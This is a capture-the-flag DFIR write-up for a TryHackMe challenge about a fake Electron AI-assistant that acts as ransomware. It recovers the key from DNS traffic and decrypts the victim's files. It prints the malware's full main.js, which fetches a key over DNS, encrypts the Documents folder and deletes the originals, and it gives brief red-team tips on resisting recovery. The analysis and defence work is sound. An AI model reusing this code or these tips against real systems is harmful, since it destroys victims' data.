# Rogue Commit - TryHackMe CTF Writeup
### TryHackMe · An AI Odyssey Event 2026

> **Author:** [georgegiannakidis](https://github.com/georgegiannakidis)  
> **Platform:** TryHackMe  
> **Room:** 2026: An AI Odyssey  
> **Challenge:** Rogue Commit  
> **Category:** AI Sec + DFIR  
> **Difficulty:** Medium  
> **Points:** 60  
> **Flag:** `THM{Wh0_Kn3w_AI_Apps_C4n_B3_m4lic10us}`

---

## Table of Contents

1. [Background & Theoretical Framework](#1-background--theoretical-framework)
2. [Challenge Description](#2-challenge-description)
3. [Environment & Evidence Inventory](#3-environment--evidence-inventory)
4. [Phase 1 - Static Analysis of the Malicious Electron App](#4-phase-1--static-analysis-of-the-malicious-electron-app)
5. [Phase 2 - Network Forensics & Key Recovery](#5-phase-2--network-forensics--key-recovery)
6. [Phase 3 - Decryption & Failed Attempts](#6-phase-3--decryption--failed-attempts)
7. [Phase 4 - Flag Extraction from PDF Metadata](#7-phase-4--flag-extraction-from-pdf-metadata)
8. [Root Cause Analysis & Full Attack Chain](#8-root-cause-analysis--full-attack-chain)
9. [MITRE ATT&CK Mapping](#9-mitre-attck-mapping)
10. [AI-Assisted Investigation - Using AI to Counter AI Malware](#10-ai-assisted-investigation--using-ai-to-counter-ai-malware)
11. [Lessons Learned](#11-lessons-learned)
12. [Defensive Recommendations](#12-defensive-recommendations)
13. [References](#13-references)

---

## 1. Background & Theoretical Framework

The growing proliferation of AI-powered desktop applications has introduced a new and underexplored attack surface: **trojanized AI tools**. As organisations and individuals increasingly trust locally-installed AI assistants, threat actors have begun packaging malware inside functional-looking Electron applications - a category of cross-platform desktop software built on web technologies (HTML, CSS, JavaScript, Node.js).

This challenge examines the intersection of two distinct but increasingly interrelated disciplines:

### 1.1 Digital Forensics & Incident Response (DFIR)

DFIR is the structured process of identifying, preserving, analysing and reporting on digital evidence following a security incident. The DFIR lifecycle - as defined by NIST SP 800-86 - comprises four phases:

1. **Collection** - Acquiring evidence without altering it
2. **Examination** - Identifying relevant data from collected artifacts
3. **Analysis** - Interpreting evidence to reconstruct events
4. **Reporting** - Documenting findings in a repeatable, verifiable manner

In this challenge, we operate in a post-incident context: the encryption has already occurred and our task is to reconstruct the attack, recover the encryption material and restore the victim's data.

### 1.2 Electron Application Security

Electron packages web-based UIs with the Chromium engine and Node.js runtime into a standalone desktop app. While this enables rapid cross-platform development, it introduces significant security considerations:

- **Full filesystem access** via Node.js APIs, unlike sandboxed web browsers
- **Source code exposure** - Electron apps bundle JavaScript in `.asar` archives, which are trivially extractable
- **Elevated trust** - Users treat desktop apps as inherently more trustworthy than web pages, lowering their guard

The `.asar` format is a tar-like archive containing all application source files. It can be extracted with the official `asar` tool, exposing the full application logic - including any malicious code - in plain JavaScript.

### 1.3 DNS as a Covert Command & Control (C2) Channel

DNS was designed for name resolution, not as a communication protocol. However, its ubiquity and the fact that it is almost universally permitted through firewalls makes it an attractive vector for covert communication. Threat actors leverage DNS TXT records - originally designed to hold arbitrary text data for purposes like SPF records - to:

- **Receive commands** from attacker-controlled infrastructure
- **Exfiltrate data** encoded in subdomains or TXT records
- **Deliver cryptographic keys** without touching conventional HTTP-based C2 infrastructure

DNS-based C2 traffic is difficult to detect because it blends with legitimate DNS traffic, is encrypted in transit (with DoH/DoT) and is rarely subject to deep packet inspection in enterprise environments.

### 1.4 Symmetric Encryption in Ransomware

Modern ransomware predominantly uses symmetric encryption - typically AES - due to its speed and the ability to encrypt large files in real time. The operational security challenge for attackers is **key management**: the key must be generated or received, used for encryption and then either stored (accessible to the attacker for decryption) or discarded (destroying the data permanently).

The hybrid approach seen in this challenge - fetching the key from an attacker-controlled DNS server at runtime - ensures:
- The key never persists on the victim's disk
- The key can be revoked by the attacker at any time (changing the TXT record)
- Recovery is impossible without a network capture from the infection moment

---

## 2. Challenge Description

> *"You have been provided with a collection of user artifacts and a packet capture from the affected machine. Your task is to investigate the suspicious application, understand how the files were altered, recover the encryption material and decrypt the victim's data to uncover what was hidden inside."*

The victim is a developer (`jmartin_dev`, AI Research Division) whose Documents folder was silently encrypted by a fake "free AI assistant" application they downloaded. We are given:

- A snapshot of the victim's Windows user profile (`user_artifacts/`)
- A full network packet capture from the time of infection (`traffic.pcapng`)

**Objective:** Find the flag hidden inside the encrypted data.

---

## 3. Environment & Evidence Inventory

| Item | Path | Type | Significance |
|------|------|------|-------------|
| `app.asar` | `Users\developer\Downloads\app.asar` | Electron archive | **The malware** - contains all app logic |
| `ai_research_division.bin` | `Users\developer\Documents\` | Encrypted binary | 571.5 kB - largest encrypted file, contains the flag |
| `vpn_credentials.bin` | `Users\developer\Documents\` | Encrypted binary | Encrypted VPN credentials |
| `notes.bin` | `Users\developer\Documents\` | Encrypted binary | Encrypted meeting notes |
| `dataset_sources.bin` | `Users\developer\Documents\` | Encrypted binary | Encrypted data source CSV |
| `traffic.pcapng` | `/root/Desktop/task/` | PCAP | Full network capture - contains the AES key in DNS |
| `Microsoft Edge.lnk` | `Users\developer\Favorites\` | Windows shortcut | Noise - not relevant |
| `Bing.url` | `Users\developer\Favorites\` | Internet shortcut | Noise - not relevant |

**Attack surface identified:** `app.asar` + `traffic.pcapng` are the critical evidence items. The `.bin` files are the encrypted output.

---

## 4. Phase 1 - Static Analysis of the Malicious Electron App

### 4.1 Extracting the .asar Archive

`.asar` files cannot be read directly. They must be extracted using the official Electron `asar` tool.

```bash
# Install via snap (npm was not available on the attackbox)
snap install asar --classic

# Extract - note: the path contains Windows-style backslashes preserved as literal characters
asar extract "/root/Desktop/task/user_artifacts/Users\developer\Downloads\app.asar" \
             /root/Desktop/task/app_extracted/

# List extracted files
find /root/Desktop/task/app_extracted -type f
```

**Output:**
```
/root/Desktop/task/app_extracted/index.html
/root/Desktop/task/app_extracted/package.json
/root/Desktop/task/app_extracted/main.js
/root/Desktop/task/app_extracted/styles.css
/root/Desktop/task/app_extracted/renderer.js
```

> **Key insight:** The first file to analyse in any Electron app is `main.js` - this is the Node.js backend process with full system access. The `renderer.js` handles the UI and is far less interesting from a malware perspective.

### 4.2 Reading main.js - Full Source Code Exposure

```javascript
const { app, BrowserWindow } = require('electron')
const os = require('os')
const fs = require('fs')
const crypto = require('crypto')
const dns = require('dns')
const path = require('path')

// Hardcoded IV - 16 bytes
const IV = Buffer.from('4b7a9c2e1f8d3a6b4b7a9c2e1f8d3a6b', 'hex')

// Attacker-controlled C2 domain
const FLAG_DOMAIN = 'free-ai-assistant.xyz'

// Target directory for encryption
const TARGET_DIR = path.join('C:', 'Users', 'developer', 'Documents')

dns.setServers(['1.1.1.1', '8.8.8.8'])

// Fetch AES key via DNS TXT record
function getKeyFromDNS(domain, callback) {
  dns.resolveTxt(domain, (err, records) => {
    const key = records.flat().join('')
    callback(key)
  })
}

// Encrypt a single file with AES-CBC
function encryptFile(inputPath, keyString) {
  const key = Buffer.from(keyString, 'hex').slice(0, 32)  // ← slices to 16 bytes (32 hex chars)
  const fileBuffer = fs.readFileSync(inputPath)
  const cipher = crypto.createCipheriv('aes-256-cbc', key, IV)
  const encrypted = Buffer.concat([cipher.update(fileBuffer), cipher.final()])
  const newPath = inputPath.replace(/\.[^.]+$/, '.bin')
  fs.writeFileSync(newPath, encrypted)
  if (newPath !== inputPath) {
    fs.unlinkSync(inputPath)  // ← deletes the original file
  }
}

function createWindow() {
  const win = new BrowserWindow({ width: 900, height: 700, ... })
  win.loadFile('index.html')

  // On app launch: fetch key → encrypt all Documents files
  getKeyFromDNS(FLAG_DOMAIN, (key) => {
    const files = fs.readdirSync(TARGET_DIR)
    files.forEach(file => {
      const filePath = path.join(TARGET_DIR, file)
      if (fs.statSync(filePath).isFile()) {
        encryptFile(filePath, key)
      }
    })
  })
}

app.whenReady().then(createWindow)
```

### 4.3 Malware Behaviour Analysis

From the source code, we can reconstruct the complete malware behaviour:

| Component | Value | Source |
|-----------|-------|--------|
| Algorithm | AES-CBC | `createCipheriv('aes-256-cbc', ...)` |
| Key size | **16 bytes (128-bit)** | `.slice(0, 32)` on a 32-char hex string = 16 bytes |
| IV | `4b7a9c2e1f8d3a6b4b7a9c2e1f8d3a6b` | Hardcoded in source |
| Key source | DNS TXT record from `free-ai-assistant.xyz` | `getKeyFromDNS()` |
| Target | `C:\Users\developer\Documents\*` | `TARGET_DIR` |
| Output | `.bin` extension, original deleted | `unlinkSync()` |

> **Critical observation:** Despite the cipher being named `'aes-256-cbc'`, Node.js accepts the actual key length provided. The hex key from DNS (`5f4514434fc47f1f661d8a73806fd436`) is 32 hex characters = **16 bytes**. This is AES-128-CBC in practice. Padding the key to 32 bytes with null bytes (as AES-256 requires) will produce incorrect decryption output - a mistake that cost us several failed attempts.

### 4.4 The Decoy UI (renderer.js)

The `renderer.js` contains a convincing-looking AI chat interface with hardcoded response strings:

```javascript
const responses = [
  "That's an interesting question! Let me think about that...",
  "Great point! Here's what I know about that topic.",
  "I understand what you're asking. The answer is nuanced.",
  // ...
]
```

This is a classic **lure mechanism**: the victim interacts with what appears to be a functional AI assistant while the encryption runs silently in the background Node.js process.

---

## 5. Phase 2 - Network Forensics & Key Recovery

### 5.1 Understanding the DNS C2 Channel

The malware calls `dns.resolveTxt('free-ai-assistant.xyz', callback)` on startup. This DNS TXT query - and crucially, the response containing the AES key - will be present in any network capture taken during the infection window.

### 5.2 Extracting the Key with tshark

Rather than opening Wireshark's GUI, we used `tshark` to filter DNS traffic and extract TXT record values directly:

```bash
tshark -r /root/Desktop/task/traffic.pcapng -Y "dns" -T fields -e dns.txt
```

**Output:**
```
5f4514434fc47f1f661d8a73806fd436
```

The AES key has been recovered: **`5f4514434fc47f1f661d8a73806fd436`** (32 hex chars = 16 bytes).

> **Why this works:** The DNS TXT record response is transmitted in plaintext (standard DNS, not DoH/DoT). The PCAP captures the full UDP packet including the TXT record data field, which tshark can extract with `-e dns.txt`.

### 5.3 Complete Cryptographic Parameters

At this point, we have all the parameters needed to decrypt:

| Parameter | Value |
|-----------|-------|
| Algorithm | AES-CBC |
| Key | `5f4514434fc47f1f661d8a73806fd436` |
| Key length | 16 bytes (AES-128) |
| IV | `4b7a9c2e1f8d3a6b4b7a9c2e1f8d3a6b` |
| IV source | Hardcoded in `main.js` |
| Padding | PKCS7 |

---

## 6. Phase 3 - Decryption & Failed Attempts

### 6.1 First Attempt - Incorrect Key Padding (Failed)

Our first decryption script padded the 16-byte key to 32 bytes with null bytes, treating the cipher as AES-256:

```python
key = bytes.fromhex("5f4514434fc47f1f661d8a73806fd436")
key = key.ljust(32, b'\x00')  # ← WRONG - pads to 32 bytes
```

**Result:** Garbage output - binary noise. The decryption ran without error (AES-256 with a zero-padded key is cryptographically valid) but produced incorrect plaintext, because the actual encryption used the 16-byte key directly.

### 6.2 Second Attempt - Path Resolution Issues (Failed)

The Windows user artifacts were stored with **literal backslashes** in directory names on the Linux filesystem:

```
/root/Desktop/task/user_artifacts/Users\developer\Documents\notes.bin
```

Initial attempts using `os.listdir()` with a string-escaped path failed because Python's `os.listdir()` does not resolve backslash-embedded paths the same way the shell does.

```python
# This fails silently or throws FileNotFoundError
bin_dir = "/root/Desktop/task/user_artifacts/Users\\developer\\Documents"
for fname in os.listdir(bin_dir):  # FileNotFoundError
    ...
```

**Fix:** Used `glob.glob()` with recursive matching, which correctly resolves the paths:

```python
import glob
files = glob.glob("/root/Desktop/task/user_artifacts/**/*.bin", recursive=True)
```

### 6.3 Successful Decryption Script

```python
from Crypto.Cipher import AES
import glob

# 16-byte key - AES-128-CBC, not AES-256
key = bytes.fromhex("5f4514434fc47f1f661d8a73806fd436")
iv  = bytes.fromhex("4b7a9c2e1f8d3a6b4b7a9c2e1f8d3a6b")

files = glob.glob("/root/Desktop/task/user_artifacts/**/*.bin", recursive=True)

for fpath in files:
    with open(fpath, "rb") as f:
        data = f.read()

    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(data)

    # Strip PKCS7 padding
    pad = decrypted[-1]
    decrypted = decrypted[:-pad]

    out_path = fpath.replace(".bin", ".txt")
    with open(out_path, "wb") as f:
        f.write(decrypted)

    print("Decrypted:", fpath)
```

**Output:**
```
Decrypted: .../ai_research_division.bin
Decrypted: .../vpn_credentials.bin
Decrypted: .../notes.bin
Decrypted: .../dataset_sources.bin
```

### 6.4 Decrypted File Summary

| File | Content |
|------|---------|
| `notes.txt` | Monthly planning meeting notes - no flag |
| `vpn_credentials.txt` | VPN access credentials for `jmartin_dev` - no flag |
| `dataset_sources.txt` | CSV of AI research data sources - no flag |
| `ai_research_division.txt` | **PDF document** - flag in metadata |

---

## 7. Phase 4 - Flag Extraction from PDF Metadata

### 7.1 Identifying the File Type

After decryption, `ai_research_division.txt` appeared to contain binary/garbage output when `cat`'d directly. The `file` command revealed the truth:

```bash
file "/root/Desktop/task/user_artifacts/Users\developer\Documents\ai_research_division.txt"
```

**Output:**
```
PDF document, version 1.6
```

The decrypted file is a PDF - the `.txt` extension was assigned by our script's string replacement. The file header `%PDF-1.6` confirmed this.

### 7.2 Extracting Text and Metadata

Standard `grep` for `THM{` against the raw binary PDF failed because PDF content is partially compressed (FlateDecode streams). We used `pdftotext` to extract all text content including metadata:

```bash
pdftotext "/root/Desktop/task/user_artifacts/Users\developer\Documents\ai_research_division.txt" - | grep -i "THM{"
```

**Output:**
```
Author: THM{Wh0_Kn3w_AI_Apps_C4n_B3_m4lic10us}
```

The flag was embedded in the PDF **Author metadata field** - a common location in CTF challenges that reflects a real-world DFIR finding: document metadata frequently reveals authorship, origin systems and editing history that attackers often overlook when attempting to sanitise stolen documents.

---

## 8. Root Cause Analysis & Full Attack Chain

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        FULL ATTACK CHAIN                                │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  1. INITIAL ACCESS                                                      │
│     Victim downloads "free-ai-assistant" from unknown source            │
│     App appears functional - has working chat UI (lure)                 │
│                          │                                              │
│                          ▼                                              │
│  2. C2 COMMUNICATION                                                    │
│     app.whenReady() → getKeyFromDNS('free-ai-assistant.xyz')           │
│     DNS TXT query → attacker server responds with AES key               │
│     Key: 5f4514434fc47f1f661d8a73806fd436 (16 bytes)                   │
│                          │                                              │
│                          ▼                                              │
│  3. ENCRYPTION                                                          │
│     Iterates C:\Users\developer\Documents\*                             │
│     Each file encrypted: AES-128-CBC, key from DNS, IV hardcoded       │
│     Original files deleted (unlinkSync) - only .bin remain             │
│                          │                                              │
│                          ▼                                              │
│  4. PERSISTENCE / IMPACT                                                │
│     Victim's documents permanently encrypted                            │
│     Key only exists in attacker's DNS TXT record                       │
│     No ransom note generated (silent ransomware variant)               │
│                                                                         │
│  ─ ─ ─ ─ ─ ─ ─ ─ ─ INVESTIGATOR RESPONSE ─ ─ ─ ─ ─ ─ ─ ─ ─          │
│                                                                         │
│  5. REVERSE ENGINEERING                                                 │
│     asar extract → main.js → full malware logic exposed                │
│     IV recovered from hardcoded constant                                │
│                          │                                              │
│                          ▼                                              │
│  6. KEY RECOVERY                                                        │
│     tshark -Y "dns" -e dns.txt → key extracted from PCAP               │
│                          │                                              │
│                          ▼                                              │
│  7. DECRYPTION                                                          │
│     Python + pycryptodome → AES-128-CBC → all files restored           │
│                          │                                              │
│                          ▼                                              │
│  8. FLAG EXTRACTION                                                     │
│     pdftotext → Author metadata → THM{Wh0_Kn3w_AI_Apps_C4n_B3_m4lic10us} │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 9. MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|--------|-----------|-----|---------|
| Initial Access | Spearphishing via Service | T1566.003 | Victim downloaded fake AI app |
| Execution | User Execution: Malicious File | T1204.002 | Victim ran the Electron app |
| Command & Control | Application Layer Protocol: DNS | T1071.004 | Key delivered via DNS TXT record |
| Command & Control | Data Encoding: Standard Encoding | T1132.001 | Key hex-encoded in TXT record |
| Impact | Data Encrypted for Impact | T1486 | All Documents encrypted with AES |
| Impact | Inhibit System Recovery | T1490 | Original files deleted post-encryption |
| Defense Evasion | Masquerading | T1036 | App disguised as legitimate AI tool |
| Defense Evasion | Obfuscated Files or Information | T1027 | Malicious logic hidden inside `.asar` |

---

## 10. AI-Assisted Investigation - Using AI to Counter AI Malware

One of the defining ironies of this challenge is that the attack vector itself is an AI tool - a fake AI assistant used to deliver ransomware. During this investigation, I countered that threat using two AI assistants: **Google Gemini** and **Anthropic Claude**. This reflects an emerging paradigm in cybersecurity: AI-augmented DFIR, where analysts leverage large language models as real-time reasoning partners during incident response.

### 10.1 Role of AI in This Investigation

Rather than replacing manual analysis, both models acted as **force multipliers** - accelerating triage, explaining concepts, generating and debugging code and helping interpret ambiguous findings at each phase of the investigation.

| Phase | AI Used | Contribution |
|-------|---------|-------------|
| Evidence triage | Claude | Mapped all artifact files, identified `app.asar` as the primary target |
| `.asar` extraction | Claude | Diagnosed `snap install --classic` flag requirement, resolved Windows backslash path issues on Linux |
| `main.js` analysis | Claude + Gemini | Annotated the full malware source, identified the AES key size discrepancy (`slice(0,32)` on a 16-byte key) |
| tshark query | Claude | Generated the exact filter to extract DNS TXT fields from the PCAP |
| Decryption script | Claude | Wrote and debugged the Python AES-CBC script; identified the PKCS7 padding strip logic |
| Failed attempt diagnosis | Claude | Diagnosed why the zero-padded AES-256 attempt produced garbage output |
| PDF metadata extraction | Claude | Suggested `pdftotext` after `grep` against raw binary failed |
| Write-up structure | Claude | Drafted this write-up in academic + hacker style, mapped MITRE techniques, structured DFIR phases |

### 10.2 Claude - Step-by-Step Investigation Partner

**Anthropic Claude (claude-sonnet-4-6)** served as the primary investigation partner throughout the challenge. The interaction was fully conversational and iterative - I shared terminal output screenshots and command results at each step and Claude adapted its guidance based on what the evidence revealed.

Key contributions:

- **Path resolution debugging:** When `asar extract` threw `ENOENT` errors, Claude immediately diagnosed that the Windows-style backslash paths were preserved as literal characters on the Linux filesystem and provided the correct quoted path syntax.
- **AES key size analysis:** Claude identified that `Buffer.from(keyString, 'hex').slice(0, 32)` on a 32-character hex string produces 16 bytes - making this AES-128, not AES-256 as the cipher name suggested. This insight was the critical fix that made decryption work.
- **Iterative script debugging:** When the first decryption script produced garbage output, Claude walked through the possible causes systematically: wrong key size → wrong padding → wrong IV - and identified the root cause.
- **PDF awareness:** Claude recognised the `%PDF-1.6` header in the `cat` output and immediately recommended `pdftotext` with a `grep` pipe, leading directly to the flag.

### 10.3 Gemini - Malware Logic Verification

**Google Gemini** was used as a second opinion during the static analysis phase - specifically to cross-validate the interpretation of `main.js`. Having two independent AI models agree on the malware's behaviour (DNS key retrieval → AES encryption → file deletion) increased confidence in the analysis before committing to the decryption approach.

Gemini was particularly useful for:

- Explaining Node.js `crypto` module behaviour and how `createCipheriv` handles key length mismatches
- Confirming that `dns.resolveTxt()` returns an array of arrays (hence `.flat().join('')`) and that the joined string would appear as-is in a PCAP TXT record

### 10.4 Reflections on AI-Augmented DFIR

Using AI during incident response raises important methodological considerations relevant to academic and professional practice:

**Strengths:**
- Dramatically accelerates the analysis of unfamiliar file formats, APIs and cryptographic implementations
- Provides real-time code generation for decryption scripts, reducing time-to-recovery
- Acts as a sounding board for hypotheses, helping analysts avoid confirmation bias
- Makes advanced DFIR techniques accessible to analysts at earlier career stages

**Limitations & Risks:**
- AI models can hallucinate plausible-sounding but incorrect technical details - all AI-generated analysis should be independently verified
- Over-reliance on AI guidance may prevent analysts from developing deep technical intuition
- AI assistants have no access to the live environment; all context must be provided by the analyst, creating a potential for misdiagnosis if output is misreported

**Conclusion:** In this challenge, AI served as a **cognitive accelerator** - not a replacement for analyst judgment, but a tool that compressed hours of manual research into minutes of focused dialogue. The meta-narrative of using AI to defeat AI-delivered malware is not merely a curiosity; it represents a genuine shift in how defensive security work is conducted in 2026.

---

## 11. Lessons Learned

### For Analysts & Defenders

| Lesson | Detail |
|--------|--------|
| **Always capture DNS traffic** | The only forensic evidence of the AES key was in the PCAP DNS response. Without it, full file recovery would have been impossible. |
| **`.asar` files are readable source code** | Any Electron application can be fully reverse-engineered by extracting its `.asar` archive. There is no obfuscation by default. |
| **AES key size ≠ cipher name** | Node.js (and OpenSSL) will use whatever key length you provide, regardless of the cipher string. Always verify byte length, not algorithm name. |
| **PDF metadata survives encryption/decryption** | Document metadata is rarely scrubbed. It's a rich forensic source for attribution and hidden data. |
| **DNS TXT records carry arbitrary data** | Monitor DNS for unexpected TXT query responses, especially to newly registered or low-reputation domains. |

### For Attackers (Red Team Perspective)

| Observation | Detail |
|-------------|--------|
| **Hardcoded IV is a weakness** | A static IV means identical plaintexts produce identical ciphertexts, enabling cryptanalysis. Randomised per-file IVs would be stronger. |
| **DNS C2 is stealthy but logged** | Modern EDR and NDR solutions increasingly monitor and log DNS TXT responses. DoH would have made key recovery from PCAP impossible. |
| **Electron apps expose source code** | Production malware would obfuscate or compile JS to bytecode (e.g., V8 snapshots) to resist static analysis. |

---

## 12. Defensive Recommendations

| Control | Implementation | Priority |
|---------|---------------|----------|
| **DNS TXT record monitoring** | Alert on DNS TXT responses from newly registered domains or domains with low reputation scores | High |
| **Application allowlisting** | Prevent execution of unsigned or unverified Electron applications via AppLocker or WDAC | High |
| **PCAP retention** | Retain network captures for a minimum of 30 days to enable post-incident key recovery | High |
| **Endpoint Detection & Response (EDR)** | Monitor for `Node.js` processes performing mass filesystem encryption followed by `unlink` calls | High |
| **DNS filtering** | Block or alert on DNS queries to domains registered within the last 30 days | Medium |
| **File backup with offline copy** | Maintain air-gapped or immutable backups - the single most effective ransomware countermeasure | High |
| **Code signing for desktop apps** | Require Authenticode/Gatekeeper signatures for all installed software | Medium |
| **User awareness training** | Train users to verify AI tool legitimacy before installation, especially free/unofficial tools | Medium |

---

## 13. References

- NIST SP 800-86 - *Guide to Integrating Forensic Techniques into Incident Response*: https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-86.pdf
- MITRE ATT&CK Framework: https://attack.mitre.org
- Electron Security Documentation: https://www.electronjs.org/docs/latest/tutorial/security
- OWASP Top 10: https://owasp.org/www-project-top-ten/
- *DNS Covert Channels: Detection and Countermeasures* - SANS Reading Room: https://www.sans.org/reading-room/
- Wireshark/tshark Display Filter Reference: https://www.wireshark.org/docs/dfref/
- pycryptodome Documentation: https://pycryptodome.readthedocs.io
- MITRE T1486 - Data Encrypted for Impact: https://attack.mitre.org/techniques/T1486/
- MITRE T1071.004 - DNS C2: https://attack.mitre.org/techniques/T1071/004/
- TryHackMe - An AI Odyssey 2026: https://tryhackme.com

---

*Written by [georgegiannakidis](https://github.com/georgegiannakidis) · May 2026*  
*TryHackMe · An AI Odyssey CTF 2026 · Rogue Commit*
